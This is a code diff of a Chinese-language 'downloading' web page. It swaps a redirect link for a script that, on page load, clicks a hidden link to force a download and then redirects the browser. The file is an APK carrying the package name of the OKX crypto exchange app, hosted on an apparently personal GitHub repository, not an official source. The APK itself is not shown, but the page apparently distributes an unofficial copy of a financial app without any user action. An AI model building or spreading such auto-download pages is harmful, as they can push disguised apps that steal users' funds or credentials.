@@ -3,9 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <title>正在下载...</title>
-  <meta http-equiv="refresh" content="0;url=https://github.com/ppj50114-byte/ppj50114-byte.github.io/releases/download/v6.136.1/com.okinc.okex.gp.apk">
 </head>
 <body>
-  <p>如果没有自动跳转，请 <a href="https://github.com/ppj50114-byte/ppj50114-byte.github.io/releases/download/v6.136.1/com.okinc.okex.gp.apk">点击这里下载</a>。</p>
+<script>
+  // 你要下载的 APK 链接
+  const url = "https://github.com/ppj50114-byte/ppj50114-byte.github.io/releases/download/v6.136.1/com.okinc.okex.gp.apk";
+
+  // 创建一个隐藏的 <a> 元素，模拟点击下载
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "com.okinc.okex.gp.apk";  // 提示保存文件名
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // 如果浏览器拦截了下载，给个备用提示
+  setTimeout(() => {
+    window.location.href = url;
+  }, 2000);
+</script>
 </body>
 </html>
